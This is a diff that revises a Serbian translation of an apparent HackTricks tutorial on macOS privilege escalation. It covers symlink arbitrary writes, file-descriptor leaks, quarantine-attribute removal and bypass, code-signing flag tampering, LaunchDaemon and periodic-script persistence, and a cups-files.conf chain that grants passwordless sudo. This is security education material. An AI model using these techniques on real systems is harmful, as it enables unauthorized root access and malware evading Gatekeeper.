@@ -4,31 +4,31 @@
 
 ## Kombinacije POSIX dozvola
 
-Za **direktorijum**, tri bita dozvola imaju drugačije značenje nego kod obične datoteke. `chmod(1)` naziva execute bit "**search**" kada se primeni na direktorijum:<sup>[2]</sup>
+Za **direktorijum**, tri bita dozvola znače nešto drugačije nego za običnu datoteku. `chmod(1)` izvršni bit naziva "**search**" kada se primeni na direktorijum:<sup>[[2]](#references)</sup>
 
-> `0100` Za datoteke, dozvoljava izvršavanje vlasniku. Za direktorijume, dozvoljava vlasniku da **pretražuje** direktorijum.
+> `0100` Za datoteke dozvoljava izvršavanje vlasniku. Za direktorijume vlasniku dozvoljava **pretragu** direktorijuma.
 
 - **read** - možete **nabrojati** unose direktorijuma (izlistati imena).
-- **write** - možete **kreirati, preimenovati i brisati unose** u direktorijumu. Imajte na umu da je ovo svojstvo *sadržavajućeg* direktorijuma, a ne datoteke: možete obrisati datoteku koju ne možete čitati ili menjati, sve dok možete pisati u njen nadređeni direktorijum.
-- Da biste obrisali **poddirektorijum**, on mora biti prazan, što zahteva dovoljno prava za uklanjanje svega unutar njega.
-- Ako direktorijum ima **sticky bit** (`S_ISVTX`, kao `/tmp`), ovo je ograničeno — POSIX navodi da proces tada može ukloniti ili preimenovati datoteke u njemu samo ako je njihov vlasnik, ako je vlasnik direktorijuma ili ako ima odgovarajuće privilegije.<sup>[1]</sup>
-- **execute / search** - **dozvoljeno vam je da prolazite kroz** direktorijum. Rezolucija putanje pronalazi svaku komponentu "u direktorijumu koji je naveden njenim prethodnikom", pa **gubitak search prava na bilo kojoj pojedinačnoj komponenti prefiksa putanje čini sve ispod nje nedostupnim putem putanje**, čak i ako je sama krajnja datoteka čitljiva za sve korisnike.<sup>[1]</sup>
+- **write** - možete **kreirati, preimenovati i brisati unose** u direktorijumu. Imajte na umu da je ovo svojstvo *sadržavajućeg* direktorijuma, a ne datoteke: možete obrisati datoteku koju ne možete čitati ili menjati, sve dok možete menjati njen nadređeni direktorijum.
+- Da biste obrisali **poddirektorijum**, on mora biti prazan, što zauzvrat zahteva dovoljno prava za uklanjanje svega što se nalazi u njemu.
+- Ako direktorijum ima **sticky bit** (`S_ISVTX`, kao `/tmp`), ovo je ograničeno — POSIX navodi da proces tada može obrisati ili preimenovati datoteke u njemu samo ako je njihov vlasnik, vlasnik direktorijuma ili ima odgovarajuće privilegije.<sup>[[1]](#references)</sup>
+- **execute / search** - **dozvoljeno vam je da prolazite kroz** direktorijum. Rezolucija putanje pronalazi svaku komponentu "u direktorijumu koji je naveden njenim prethodnikom", pa **gubitak prava pretrage na bilo kojoj pojedinačnoj komponenti prefiksa putanje čini sve ispod nje nedostupnim putem putanje**, čak i ako je sama krajnja datoteka čitljiva za sve korisnike.<sup>[[1]](#references)</sup>
 
 ### Opasne kombinacije
 
-**Kako prepisati datoteku/folder čiji je vlasnik root**, ali:
+**Kako prepisati datoteku/direktorijum čiji je vlasnik root**, ali:
 
 - Vlasnik jednog nadređenog **direktorijuma** u putanji je korisnik
-- Vlasnik jednog nadređenog **direktorijuma** u putanji je **users grupa** sa **write pristupom**
-- Jedna **users grupa** ima **write** pristup **datoteci**
+- Vlasnik jednog nadređenog **direktorijuma** u putanji je **users grupa** sa **write** pristupom
+- Jedna **grupa** korisnika ima **write** pristup **datoteci**
 
-Kod bilo koje od prethodnih kombinacija, napadač bi mogao da **ubaci** **sym/hard link** na očekivanu putanju kako bi dobio privilegovani arbitrary write.
+Kod bilo koje od prethodnih kombinacija, napadač bi mogao da **ubaci** **sym/hard link** na očekivanu putanju i dobije privilegovani arbitrary write.
 
-### Poseban slučaj foldera root R+X
+### Poseban slučaj root direktorijuma sa R+X dozvolama
 
-Ovo direktno proizlazi iz prethodno navedenog pravila rezolucije putanje. Ako **direktorijum dozvoljava samo R+X root-u**, datoteke unutar njega su *po putanji* nedostupne svima ostalima — ali **bitovi dozvola samih datoteka i dalje mogu biti permisivni**. Direktorijum je jedina prepreka.
+Ovo direktno proizlazi iz prethodno navedenog pravila rezolucije putanje. Ako direktorijum daje **R+X samo root-u**, datoteke unutar njega su *putem putanje* nedostupne svima ostalima — ali sopstveni bitovi dozvola **datoteka** i dalje mogu biti permisivni. Direktorijum je jedina prepreka.
 
-Zato se svaki primitive koji vam omogućava da iznesete datoteku **iz tog direktorijuma** — privilegovani proces koji **premešta/preimenuje/kopira** putanju koju je izabrao napadač na lokaciju kroz koju možete prolaziti — pretvara u arbitrary read, bez potrebe da ikada zaobiđete mode same datoteke:
+Zato se svaki primitive koji vam omogućava da izvučete datoteku **iz tog direktorijuma** — privilegovani proces koji **premešta/preimenuje/kopira** putanju koju je izabrao napadač na lokaciju kroz koju možete prolaziti — pretvara u arbitrary read, bez potrebe da se ikada zaobiđe sopstveni mode datoteke:
 ```bash
 # Reproduce the primitive locally
 sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
@@ -40,30 +40,30 @@ cat /tmp/locked/data.txt     # Permission denied
 # The file itself is mode 644 - only the parent directory's search bit blocks you.
 sudo ls -l /tmp/locked/
 ```
-Potražite privilegovane procese za premeštanje datoteka (installers, log rotators, crash/diagnostic collectors, backup i "export" funkcije) koji prihvataju putanju izvora od korisnika sa nižim privilegijama.
+Potražite privileged file movers (installere, rotatore logova, crash/diagnostic collectore, backup i „export“ funkcije) koji prihvataju source path od korisnika sa nižim privilegijama.
 
 ## Symbolic Link / Hard Link
 
 ### Permissive file/folder
 
-Ako privilegovani proces upisuje podatke u **file** koji bi mogao biti **controlled** od strane korisnika sa **lower privileged** privilegijama, ili koji je korisnik sa nižim privilegijama mogao **prethodno kreirati**. Korisnik ga može jednostavno **usmeriti na drugu datoteku** pomoću Symbolic ili Hard link-a, pa će privilegovani proces upisivati u tu datoteku.
+Ako privileged proces upisuje podatke u **file** koji može biti **kontrolisan** od strane **korisnika sa nižim privilegijama**, ili koji je korisnik sa nižim privilegijama mogao **prethodno kreirati**. Korisnik može jednostavno da ga **usmeri na drugi file** pomoću Symbolic ili Hard link-a, pa će privileged proces upisivati u taj file.
 
-Proverite druge odeljke u kojima bi napadač mogao **zloupotrebiti proizvoljni upis za eskalaciju privilegija**.
+Proverite druge odeljke u kojima bi napadač mogao da **zloupotrebi arbitrary write za eskalaciju privilegija**.
 
 ### Open `O_NOFOLLOW`
 
-Prema [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Proverava se samo **poslednja** komponenta — svaka **međukomponenta** se i dalje razrešava i prati. Zato developer koji je "zaštitio" upis pomoću `O_NOFOLLOW` i dalje može biti napadnut postavljanjem symlink-a u bilo koji **nadređeni direktorijum** ciljne putanje.<sup>[3]</sup>
+Prema [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *„Ako se `O_NOFOLLOW` koristi u maski, a ciljni file prosleđen funkciji `open()` jeste symbolic link, tada će `open()` biti neuspešan.“* Proverava se samo **poslednja** komponenta — svaka **međukomponenta** se i dalje razrešava i prati. Zato developer koji je „zaštitio“ upis pomoću `O_NOFOLLOW` i dalje može biti napadnut postavljanjem symbolic link-a u bilo koji **nadređeni direktorijum** ciljne putanje.<sup>[[3]](#references)</sup>
 
-Ista man stranica dokumentuje zastavice koje zaista uklanjaju taj nedostatak:<sup>[3]</sup>
+Ista man stranica dokumentuje flag-ove koji zaista zatvaraju tu prazninu:<sup>[[3]](#references)</sup>
 
-- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
-- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*
+- **`O_NOFOLLOW_ANY`** — *„ako je ... bilo koja komponenta putanje prosleđene funkciji `open()` symbolic link, tada će `open()` biti neuspešan.“*
+- **`O_RESOLVE_BENEATH`** — *„ako ... navedeno razrešavanje putanje izađe iz direktorijuma povezanog sa fd-om, tada će `openat()` biti neuspešan.“*
 
-U suprotnom, `openat()` relativan u odnosu na directory FD koji ste prethodno validirali, ili `realpath()` + ponovna validacija, predstavljaju preostale načine za sprečavanje zamene symlink-a unutar putanje.
+U suprotnom, `openat()` relativno u odnosu na directory FD koji ste već validirali, ili `realpath()` + ponovna validacija, predstavljaju preostale načine za sprečavanje zamene symbolic link-a u sredini putanje.
 
 ## .fileloc
 
-Datoteke sa ekstenzijom **`.fileloc`** mogu upućivati na druge aplikacije ili binarne datoteke, tako da će se, kada se otvore, izvršiti upravo ta aplikacija/binarna datoteka.\
+File-ovi sa ekstenzijom **`.fileloc`** mogu upućivati na druge aplikacije ili binarne file-ove, tako da će, kada se otvore, upravo ta aplikacija/binarni file biti izvršen.\
 Primer:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -77,29 +77,29 @@ Primer:
 </dict>
 </plist>
 ```
-## Deskriptori fajlova
+## Deskriptori datoteka
 
 ### Leak FD (bez `O_CLOEXEC`)
 
-Ako poziv funkcije `open` nema flag `O_CLOEXEC`, deskriptor fajla će biti nasleđen od strane procesa potomka. Dakle, ako privilegovani proces otvori privilegovani fajl i izvrši proces pod kontrolom napadača, napadač će **naslediti FD nad privilegovanim fajlom**.
+Ako poziv funkcije `open` nema oznaku `O_CLOEXEC`, deskriptor datoteke će biti nasleđen od strane podređenog procesa. Dakle, ako privilegovani proces otvori privilegovanu datoteku i izvrši proces kojim upravlja attacker, attacker će **naslediti FD ka privilegovanoj datoteci**.
 
-Kanonski primer je **`DYLD_PRINT_TO_FILE` LPE u OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>
+Klasičan primer je **`DYLD_PRINT_TO_FILE` LPE u OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>
 
-- `dyld` je uvažavao `DYLD_PRINT_TO_FILE=/path` čak i u **restricted (suid root) binarnim fajlovima**, zato što je ta konkretna promenljiva parsirana izvan funkcije `processDyldEnvironmentVariable()`.
-- Izvršavao je `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, pa je **kreirao fajl u vlasništvu root-a na proizvoljnoj putanji**.
-- FD **nikada nije bio zatvoren i nije imao close-on-exec flag**, pa je svaki potomak suid binarnog fajla nasledio **upisiv FD ka fajlu u vlasništvu root-a**.
-- Pokretanje, na primer, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a zatim čitanje broja nasleđenog FD-a u procesu potomku omogućilo je proizvoljne upise u fajl u vlasništvu root-a; `fcntl(fd, F_SETFL, 0)` je čak uklanjao `O_APPEND`, čime je omogućeno prepisivanje umesto dodavanja na kraj fajla.
+- `dyld` je poštovao `DYLD_PRINT_TO_FILE=/path` čak i u **restricted (suid root) binarnim datotekama**, zato što je ta konkretna promenljiva parsirana izvan `processDyldEnvironmentVariable()`.
+- Izvršavao je `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, čime je **kreirao datoteku u vlasništvu root-a na proizvoljnoj putanji**.
+- FD **nikada nije bio zatvoren i nije imao close-on-exec oznaku**, pa je svaki podređeni proces suid binarne datoteke nasledio **upisiv FD ka datoteci u vlasništvu root-a**.
+- Pokretanje, na primer, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a zatim čitanje broja nasleđenog FD-a u podređenom procesu, omogućilo je proizvoljne upise u datoteke u vlasništvu root-a; `fcntl(fd, F_SETFL, 0)` je čak uklanjao `O_APPEND`, omogućavajući prepisivanje umesto dodavanja na kraj.
 
-Isti obrazac se pojavljuje kad god privilegovani proces otvori fajl **pre nego što** izvrši nešto što vi kontrolišete (helper tools, editore u stilu `crontab`-a pokrenute kroz `$EDITOR`, log/debug fajlove otvorene iz putanje navedene u env-var...). Nabrojte FD-ove koje ste nasledili pomoću:
+Isti obrazac se pojavljuje svaki put kada privilegovani proces otvori datoteku **pre nego što** izvrši nešto što vi kontrolišete (helper tools, editore u stilu `crontab`-a pokrenute preko `$EDITOR`, log/debug datoteke otvorene sa putanje iz env varijable...). Nabrojte FD-ove koje ste nasledili pomoću:
 ```bash
 # From inside the child process
 ls -l /dev/fd/
 # or
 lsof -p $$
 ```
-Sve iznad `2` što upućuje na datoteku koju ne možete sami da otvorite predstavlja arbitrary-write (ili arbitrary-read) primitive.
+Sve iznad `2` što pokazuje na datoteku koju ne možete sami da otvorite predstavlja arbitrary-write (ili arbitrary-read) primitive.
 
-## Izbegavanje trikova sa quarantine xattrs
+## Izbegavajte trikove sa quarantine xattrs
 
 ### Uklonite ga
 ```bash
@@ -107,7 +107,7 @@ xattr -d com.apple.quarantine /path/to/file_or_app
 ```
 ### uchg / uchange / uimmutable flag
 
-Ako fajl/folder ima ovaj nepromenljivi atribut, na njega neće biti moguće postaviti xattr
+Ako datoteka/fascikla ima ovaj immutable atribut, neće biti moguće postaviti xattr na nju
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -119,20 +119,20 @@ ls -lO /tmp/asd
 ```
 ### Sistemi datoteka bez podrške za xattr
 
-Ne čuva svaki sistem datoteka koji macOS može da montira **proširene atribute** izvorno. HFS+ i APFS ih podržavaju; **FAT32, exFAT i (većina) NFS montiranja ih ne podržavaju** — macOS ih emulira upisivanjem pomoćne **AppleDouble** datoteke pod nazivom `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>
+Ne čuva svaki sistem datoteka koji macOS može da montira **extended attributes** izvorno. HFS+ i APFS ih podržavaju; **FAT32, exFAT i (većina) NFS mount-ova ih ne podržava** — macOS ih emulira upisivanjem **AppleDouble** pomoćne datoteke pod nazivom `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>
 
-To je važno za quarantine, jer xattr opstaje samo ako zaista može da se upiše **i ponovo pročita** sa istog volumena:
+To je važno za quarantine, jer xattr opstaje samo ako se zaista može upisati **i ponovo pročitati** sa istog volumena:
 ```bash
 # Check whether a mount point round-trips xattrs at all
 xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
 xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
 ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
 ```
-Ako se tom volumenu kasnije pristupi putem putanje koja ignoriše prateći `._` fajl (ili se prateći fajl ukloni/obriše), fajl stiže **bez quarantine flag-a** — a nekvarantinski `.app` je dovoljan za izlazak iz App Sandbox-a, kao što je objašnjeno u [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).
+Ako se tom volumenu kasnije pristupi preko putanje koja ignoriše prateći `._` fajl (ili se prateći fajl ukloni/obriše), fajl stiže **bez quarantine zastavice** — a `.app` bez quarantine zastavice dovoljan je za izlazak iz App Sandbox-a, kao što je objašnjeno u [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).
 
 ### writeextattr ACL
 
-Ovaj ACL sprečava dodavanje `xattrs` datoteci
+Ovaj ACL sprečava dodavanje `xattrs` fajlu
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -155,13 +155,13 @@ ls -le /tmp/test
 ```
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** format datoteke kopira datoteku, uključujući njene ACE-ove.
+Format datoteke **AppleDouble** kopira datoteku zajedno sa njenim ACE-ovima.
 
-U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da će tekstualna reprezentacija ACL-a, sačuvana unutar xattr-a pod nazivom **`com.apple.acl.text`**, biti postavljena kao ACL u dekompresovanoj datoteci. Dakle, ako ste aplikaciju kompresovali u zip datoteku koristeći **AppleDouble** format datoteke sa ACL-om koji sprečava upisivanje drugih xattr-ova u nju... quarantine xattr nije bio postavljen u aplikaciju:
+U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da će tekstualna reprezentacija ACL-a, sačuvana unutar xattr-a pod nazivom **`com.apple.acl.text`**, biti postavljena kao ACL u dekompresovanoj datoteci. Dakle, ako ste aplikaciju kompresovali u zip datoteku koristeći format datoteke **AppleDouble** sa ACL-om koji sprečava upisivanje drugih xattr-ova u nju... quarantine xattr nije postavljen u aplikaciju:
 
-Pogledajte [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.<sup>[6]</sup>
+Pogledajte [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.<sup>[[6]](#references)</sup>
 
-Da bismo ovo reprodukovali, prvo moramo dobiti ispravan ACL string:
+Da bismo ovo replicirali, prvo moramo dobiti ispravan ACL string:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -190,13 +190,13 @@ macos-xattr-acls-extra-stuff.md
 
 ## Zaobilaženje provera potpisa
 
-### Zaobilaženje provera platform binaries
+### Zaobilaženje provera platformskih binarnih fajlova
 
-Neke bezbednosne provere proveravaju da li je binary **platform binary**, na primer kako bi dozvolile povezivanje sa XPC service. Međutim, kao što je prikazano u tekstu o zaobilaženju na https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, moguće je zaobići ovu proveru tako što se preuzme platform binary (kao što je /bin/ls) i exploit ubaci putem dyld-a koristeći env promenljivu `DYLD_INSERT_LIBRARIES`.<sup>[7]</sup>
+Neke bezbednosne provere proveravaju da li je binarni fajl **platform binary**, na primer da bi dozvolile povezivanje sa XPC servisom. Međutim, kao što je prikazano u tekstu o zaobilaženju na https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, ovu proveru je moguće zaobići tako što se preuzme platform binary (kao što je /bin/ls) i exploit ubaci putem dyld-a koristeći promenljivu okruženja `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>
 
-### Zaobilaženje flags `CS_REQUIRE_LV` i `CS_FORCED_LV`
+### Zaobilaženje zastavica `CS_REQUIRE_LV` i `CS_FORCED_LV`
 
-Moguće je da executing binary izmeni sopstvene flags kako bi zaobišao provere pomoću koda kao što je:<sup>[7]</sup>
+Moguće je da izvršavajući binarni fajl izmeni sopstvene zastavice kako bi zaobišao provere, pomoću koda kao što je:<sup>[[7]](#references)</sup>
 ```c
 // Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
 int pid = getpid();
@@ -211,9 +211,9 @@ NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, statu
 ```
 ## Zaobilaženje Code Signatures
 
-Bundles sadrže fajl **`_CodeSignature/CodeResources`** koji sadrži **hash** svakog pojedinačnog **fajla** u okviru **bundle-a**. Imajte na umu da je hash fajla CodeResources takođe **ugrađen u izvršni fajl**, tako da ni njega ne možemo menjati.
+Bundles sadrže fajl **`_CodeSignature/CodeResources`** koji sadrži **hash** svakog pojedinačnog **fajla** u **bundle-u**. Imajte na umu da je hash fajla CodeResources takođe **ugrađen u izvršni fajl**, tako da ni njega ne možemo menjati.
 
-Međutim, postoje neki fajlovi čiji se potpis neće proveravati; oni imaju ključ `omit` u plist-u, na primer:
+Međutim, postoje neki fajlovi čiji se potpis neće proveravati; oni imaju ključ `omit` u plist-u, kao što je:
 ```xml
 <dict>
 ...
@@ -257,13 +257,13 @@ Međutim, postoje neki fajlovi čiji se potpis neće proveravati; oni imaju klju
 ...
 </dict>
 ```
-Moguće je izračunati potpis resursa iz komandne linije pomoću:
+Moguće je izračunati potpis resursa iz CLI-ja pomoću:
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
 ## Montiranje dmg-ova
 
-Korisnik može da montira prilagođeni dmg čak i preko nekih postojećih fascikli. Ovako možete da kreirate prilagođeni dmg paket sa prilagođenim sadržajem:
+Korisnik može da montira prilagođeni dmg kreiran čak i preko nekih postojećih foldera. Ovako možete da kreirate prilagođeni dmg paket sa prilagođenim sadržajem:
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -284,20 +284,20 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # You can also create a dmg from an app using:
 hdiutil create -srcfolder justsome.app justsome.dmg
 ```
-Obično macOS montira disk komunicirajući sa Mach servisom `com.apple.DiskArbitrarion.diskarbitrariond` (koji obezbeđuje `/usr/libexec/diskarbitrationd`). Ako se parametar `-d` doda u LaunchDaemons plist fajl i servis ponovo pokrene, logovi će se čuvati u `/var/log/diskarbitrationd.log`.\
-Međutim, moguće je koristiti alate kao što su `hdik` i `hdiutil` za direktnu komunikaciju sa `com.apple.driver.DiskImages` kext-om.
+Obično macOS montira disk tako što komunicira sa Mach servisom `com.apple.DiskArbitrarion.diskarbitrariond` (koji obezbeđuje `/usr/libexec/diskarbitrationd`). Ako se parametar `-d` doda u LaunchDaemons plist datoteku i servis ponovo pokrene, logovi će se čuvati u `/var/log/diskarbitrationd.log`.\
+Međutim, moguće je koristiti alate poput `hdik` i `hdiutil` za direktnu komunikaciju sa `com.apple.driver.DiskImages` kext-om.
 
 ## Arbitrary Writes
 
-### Periodic sh scripts
+### Periodic sh skripte
 
-Ako vaš script može da se interpretira kao **shell script**, možete prepisati **`/etc/periodic/daily/999.local`** shell script, koji će se pokretati svakog dana.
+Ako vaša skripta može da se interpretira kao **shell script**, možete prepisati **`/etc/periodic/daily/999.local`** shell skriptu koja će se pokretati svakog dana.
 
-Možete **simulirati** izvršavanje ovog script-a pomoću: **`sudo periodic daily`**
+Možete **simulirati** izvršavanje ove skripte pomoću: **`sudo periodic daily`**
 
-### Daemons
+### Daemoni
 
-Upišite proizvoljni **LaunchDaemon**, kao što je **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, sa plist-om koji izvršava proizvoljni script, na primer:
+Upišite proizvoljni **LaunchDaemon**, kao što je **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, sa plist datotekom koja izvršava proizvoljnu skriptu, kao što je:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -320,15 +320,15 @@ Samo generišite skriptu `/Applications/Scripts/privesc.sh` sa **commands** koje
 
 Ako imate **arbitrary write**, možete kreirati fajl unutar foldera **`/etc/sudoers.d/`** koji vam dodeljuje **sudo** privilegije.
 
-### PATH files
+### PATH fajlovi
 
 Fajl **`/etc/paths`** je jedno od glavnih mesta koje popunjava PATH env promenljivu. Morate biti root da biste ga prepisali, ali ako skripta iz **privileged process** izvršava neku **command without the full path**, možda ćete moći da je **hijack** tako što ćete izmeniti ovaj fajl.
 
-Takođe možete upisivati fajlove u **`/etc/paths.d`** da biste učitali nove foldere u **PATH** env promenljivu.
+Takođe možete upisivati fajlove u **`/etc/paths.d`** da biste učitali nove foldere u `PATH` env promenljivu.
 
 ### cups-files.conf
 
-Ova tehnika je korišćena u [ovom writeup-u](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[8]</sup>
+Ova tehnika je korišćena u [ovom writeup-u](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>
 
 Kreirajte fajl `/etc/cups/cups-files.conf` sa sledećim sadržajem:
 ```
@@ -336,24 +336,24 @@ ErrorLog /etc/sudoers.d/lpe
 LogFilePerm 777
 <some junk>
 ```
-Ovim će se kreirati datoteka `/etc/sudoers.d/lpe` sa dozvolama 777. Dodatni sadržaj na kraju služi za pokretanje kreiranja error log-a.
+Ovo će kreirati datoteku `/etc/sudoers.d/lpe` sa dozvolama 777. Dodatni sadržaj na kraju služi za pokretanje kreiranja error log-a.
 
-Zatim upišite u `/etc/sudoers.d/lpe` potrebnu konfiguraciju za escalation privilegija, kao što je `%staff ALL=(ALL) NOPASSWD:ALL`.
+Zatim u `/etc/sudoers.d/lpe` upišite potrebnu konfiguraciju za escalate privileges, kao što je `%staff ALL=(ALL) NOPASSWD:ALL`.
 
-Nakon toga ponovo izmenite datoteku `/etc/cups/cups-files.conf`, navodeći `LogFilePerm 700`, kako bi nova sudoers datoteka postala validna prilikom pozivanja `cupsctl`.
+Zatim ponovo izmenite datoteku `/etc/cups/cups-files.conf`, navodeći `LogFilePerm 700`, kako bi nova sudoers datoteka postala validna prilikom pozivanja `cupsctl`.
 
-### Izlazak iz Sandbox-a
+### Escape iz sandbox-a
 
-Moguće je izaći iz macOS sandbox-a pomoću FS arbitrary write primitive. Za neke primere pogledajte stranicu [macOS Auto Start](../../../../macos-auto-start-locations.md), ali čest način je upisivanje Terminal preferences datoteke u `~/Library/Preferences/com.apple.Terminal.plist`, koja izvršava komandu pri pokretanju, a zatim njeno pozivanje pomoću `open`.
+Moguće je escape-ovati macOS sandbox pomoću FS arbitrary write. Za nekoliko primera pogledajte stranicu [macOS Auto Start](../../../../macos-auto-start-locations.md), ali uobičajen primer je upisivanje Terminal preferences datoteke u `~/Library/Preferences/com.apple.Terminal.plist`, koja izvršava komandu pri pokretanju, i njeno pozivanje pomoću `open`.
 
-## Kreiranje datoteka koje se mogu pisati kao drugi korisnici
+## Generisanje datoteka koje mogu da se upisuju kao drugi korisnici
 
-Veoma česta privesc primitiva jeste navođenje **privilegovanog procesa da kreira datoteku za vas** u direktorijumu koji kontrolišete, a zatim zadržavanje **write access**-a nad tom datotekom. Potrebna su dva elementa:
+Veoma čest privesc primitive jeste da **privileged process kreira datoteku za vas** u direktorijumu koji kontrolišete, a zatim zadržavanje **write access** nad tom datotekom. Potrebna su dva elementa:
 
-1. Direktorijum čiji ste vlasnik (ili u kom možete postaviti **inheritable ACL**), tako da sve što se u njemu kreira nasledi vaše dozvole.
-2. Privilegovan/`suid` proces kojem se može odrediti **gde** da kreira datoteku — najčešće putem debug/logging environment variable-a, configuration datoteke ili helper-ovog XPC API-ja.
+1. Direktorijum čiji ste vlasnik (ili u kojem možete postaviti **inheritable ACL**), tako da sve što se u njemu kreira nasleđuje vaše dozvole.
+2. Privileged/`suid` proces kojem se može saopštiti **gde** da kreira datoteku — obično pomoću debug/logging environment variable-a, config datoteke ili helper-ovog XPC API-ja.
 
-Deo sa **inheritable ACL**-om omogućava da datoteka koju proces kreira bude writable za vas, iako je u vlasništvu drugog korisnika. Zastavice nasleđivanja `file_inherit` / `directory_inherit` dokumentovane su u [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
+**Inheritable ACL** deo je ono što kreiranu datoteku čini writable za vas, iako je njen vlasnik drugi korisnik. Flag-ovi nasleđivanja `file_inherit` / `directory_inherit` dokumentovani su u [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
 ```bash
 DIRNAME=/tmp/inherit_test
 mkdir -p "$DIRNAME"
@@ -363,13 +363,13 @@ chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextat
 
 ls -lde "$DIRNAME"   # confirm the ACE is present
 ```
-Sada je svaka datoteka koju privilegovani proces kreira unutar `$DIRNAME` **upisiva za vas**. Ako je taj direktorijum takođe lokacija iz koje se kasnije nešto **izvršava kao root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, direktorijum LaunchDaemon...), ovo predstavlja direktnu eskalaciju privilegija na root. Pogledajte odeljke [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) iznad da biste videli šta treba upisati kada dobijete datoteku.
+Sada je svaka datoteka koju privilegovani proces kreira unutar `$DIRNAME` **upisiva za vas**. Ako je taj direktorijum takođe lokacija iz koje se kasnije nešto **izvršava kao root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, direktorijum LaunchDaemon-a...), ovo predstavlja direktnu root eskalaciju. Pogledajte odeljke [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) iznad da biste videli šta treba upisati kada dobijete datoteku.
 
-Za kompletan praktični primer lanca „env promenljiva natera root proces da kreira datoteku, a FD procuri do vas“ pogledajte [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) iznad.
+Za kompletan primer lanca „env promenljiva natera root proces da kreira datoteku, a FD procuri do vas“, pogledajte [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) iznad.
 
 ## POSIX deljena memorija
 
-**POSIX deljena memorija** omogućava procesima u POSIX-kompatibilnim operativnim sistemima da pristupaju zajedničkoj memorijskoj oblasti, čime se omogućava brža komunikacija u poređenju sa drugim metodama komunikacije između procesa. To podrazumeva kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, postavljanje njegove veličine pomoću `ftruncate()` i mapiranje u adresni prostor procesa korišćenjem `mmap()`. Procesi zatim mogu direktno da čitaju iz ove memorijske oblasti i upisuju u nju. Za upravljanje konkurentnim pristupom i sprečavanje oštećenja podataka često se koriste mehanizmi za sinhronizaciju, kao što su mutex-i ili semafori. Na kraju, procesi uklanjaju mapiranje i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, a opciono mogu ukloniti objekat memorije pomoću `shm_unlink()`. Ovaj sistem je naročito efikasan za brz IPC u okruženjima u kojima više procesa mora brzo da pristupa deljenim podacima.
